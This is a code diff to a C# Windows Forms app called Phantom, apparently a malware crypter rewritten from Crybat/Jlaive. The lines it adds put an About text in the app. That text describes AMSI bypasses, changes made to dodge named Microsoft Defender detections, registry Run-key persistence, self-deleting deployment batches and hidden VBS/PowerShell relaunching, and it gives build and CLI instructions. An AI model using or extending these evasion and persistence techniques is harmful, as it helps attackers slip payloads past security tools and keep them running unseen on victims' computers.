@@ -34,6 +34,40 @@ namespace Phantom
             }
             Task.Factory.StartNew(CheckVersion);
             UpdateKeys(sender, e);
+            aboutTextBox.Text = @"Phantom - Crybat/Jlaive Rewrite
+================================
+Originally created by C5Hackr
+Modded by Trapwithme
+
+What's different from C5Hackr's original:
+- UAC Bypass removed: HWBP (SetThreadContext+VEH) and
+  VirtualProtect on amsi.dll triggered
+  Behavior:Win32/SuspAmsiPatch.F/K. Cleaner to prompt.
+- AMSI bypass removed: original used Assembly.Load(byte[])
+  which triggered AMSI; this fork uses
+  Assembly.LoadFrom(GetTempFileName) instead.
+- No VBS in startup: Registry Run key points directly to
+  cmd.exe /c batchpath instead of a .vbs launcher (eliminates
+  Trojan:VBS/Runner.LPAA!MTB).
+- AppData-aware self-delete: startup copies in %APPDATA%
+  are never deleted; only the original deployment batch
+  melts itself.
+- Guard-before-admin ordering: VBS guard flag check runs
+  first, so hidden relaunches skip admin elevation entirely
+  (1 UAC prompt instead of cascading).
+- goto instead of if blocks: batch parser doesn't choke on
+  parentheses inside echo CreateObject(...).
+- INT3 VEH AMSI bypass in payload stub and PowerShell
+  decryption script (no HWBP debug registers).
+- Self-relaunch VBS + PowerShell VBS for hidden execution
+  with zero hanging windows.
+
+Build: MSBuild Phantom.csproj /p:Configuration=Release
+Output: bin\Release\Phantom.exe
+
+CLI: Phantom.exe --cli <input_exe> <output_bat>
+
+https://github.com/Trapwithme/Phantom";
         }
 
         private void Form1_FormClosing(object sender, FormClosingEventArgs e)
